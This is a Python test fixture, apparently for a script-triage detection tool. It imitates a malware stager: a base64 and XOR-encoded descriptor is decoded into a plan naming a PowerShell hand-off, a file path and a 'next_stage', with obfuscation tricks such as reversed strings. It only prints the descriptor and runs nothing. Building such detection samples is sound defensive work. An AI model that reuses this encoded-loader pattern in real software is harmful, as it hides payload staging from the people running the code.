#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_ae6e4bec = "m3wFr1OZJEegHYkkVLxEiB5UvE6LKFCmUow1XrxOwS1YsEGZJGi6TpkkRaNSiDVSoQyJKESjQZkiX4xOiDlDjFOZIFC2XIwlVqNUiDMKo1mZKVi9f5kuaKNPmiRFoEiILVuvU5kgULZ/ji5CvVTQckugWYM1VqsdgSBasUSMHlO6U50gQ7BIkS5VtVWeIlanSYIvCqFFmyRFoEWJHlGhQYosUr1Unj1UslKfKFKhHZcoR7JQnR5HqlqRNl69RII2RIxDhSBevR2OLFOMVIIeR6pUhS5Zr0OMLEeySYovaLpE0CJWvlCMKFC9DYx4VOsU2HgGtRKRJ16/RbIxVqdI0AIN/HCfLlChQYAFVqdBwglCvVSfJESgbIwjGP1VnSVWp0XAIA6wGNl0DuJG329HqlyDJE+nf541VrRF0DFOsBPVbEW2Q4I3UqFFiW9Hqg=="

CODEC_ae6e4bec = "base64_literal|repeating_key_xor|ed,41,37,d3,20"



def load_ae6e4bec():

    return base64.b64decode(MATERIAL_ae6e4bec)



def decode_ae6e4bec(EnCoDeD_Bytes):

    key_bytes = (237, 65, 55, 211, 32,)

    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(EnCoDeD_Bytes))



def recover_ae6e4bec():

    NeUtRaL = None

    try:

        DeCoDeD_Bytes = decode_ae6e4bec(load_ae6e4bec())

    except (TypeError, ValueError) as error:

        raise RuntimeError("configuration recovery failed") from error

    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")

    return DeScRiPtOr_Text



def inspect_ae6e4bec():

    stream = io.BytesIO(recover_ae6e4bec().encode("ascii"))

    return stream.read().decode("ascii")



def surface_ae6e4bec():

    dispatch = lambda *items: tuple(items)

    return dispatch("lambda_dispatch", "reversed_fragments", "zipapp_pyz", "cmd_to_python")



def obfuscation_ae6e4bec():

    return "stnemgarf_desrever"[::-1]



def plan_ae6e4bec():

    fields = dict(item.split("=", 1) for item in inspect_ae6e4bec().split("|"))

    analysis_surface = surface_ae6e4bec()

    obfuscation_surface = obfuscation_ae6e4bec()

    operation_plan = ("python_to_powershell", fields["file_path"], fields["next_stage"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_ae6e4bec())

